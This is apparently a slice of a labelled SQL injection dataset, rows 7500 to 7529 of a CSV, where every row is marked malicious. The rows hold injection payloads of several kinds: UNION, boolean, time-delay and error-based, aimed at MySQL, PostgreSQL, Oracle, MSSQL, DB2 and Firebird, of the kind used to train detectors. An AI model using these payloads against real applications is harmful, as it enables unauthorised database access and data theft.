row_index,payload_norm,label,sqli_type_hint
7500,-5147 or ( 8459 = 8459 ) *4906,1,
7501,"1' ) ) union all select null,null,null,null,null,null,null#",1,
7502,"1"" ) as bksv where 5375 = 5375",1,
7503,"-3017"" ) ) as ljit where 9128 = 9128 union all select 9128,9128,9128,9128,9128--",1,
7504,"1' ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'dreq' = 'dreq",1,
7505,"1%"" ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ""%"" = """,1,
7506,1 ) where 6039 = 6039 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1,
7507,"-4371' ) ) ) union all select 7465,7465,7465,7465,7465,7465,7465#",1,
7508,1 ) and 7533 = 7533,1,
7509,"1 ) where 9371 = 9371 union all select null,null,null,null,null,null,null--",1,
7510,"1, ( select ( case when ( 3902 = 3902 ) then ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) else 1/ ( select 0 from dual ) end ) from dual )",1,
7511,1%' union all select null--,1,
7512,"1"" ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""xtyt"" = ""xtyt",1,
7513,"select sleep ( 5 ) and ( ( ""twed"" like ""twed",1,
7514,1' where 8729 = 8729,1,
7515,"1' ) ) and elt ( 4249 = 4249,7259 ) and ( ( 'xjns' = 'xjns",1,
7516,"-3667%' ) ) union all select 3560,3560,3560--",1,
7517,"-8655 ) where 3910 = 3910 union all select 3910,3910#",1,
7518,"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",1,
7519,-5569' ) as cjaf where 3753 = 3753 union all select 3753#,1,
7520,1 ) where 9078 = 9078 rlike sleep ( 5 ) #,1,
7521,"1' ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 'tkcy' like 'tkcy",1,
7522,-2210' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'myvr' like 'myvr,1,
7523,"1%"" union all select null,null,null,null,null,null,null,null,null--",1,
7524,select ( case when ( 1868 = 5071 ) then 1 else 1868* ( select 1868 from master..sysdatabases ) end ) --,1,
7525,"1' ) as hlbq where 2347 = 2347 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
7526,"1 ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
7527,"1'+ ( select acax where 4169 = 4169 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",1,
7528,1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'ujds' = 'ujds,1,
7529,1 ) ) as hxtp where 5478 = 5478 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
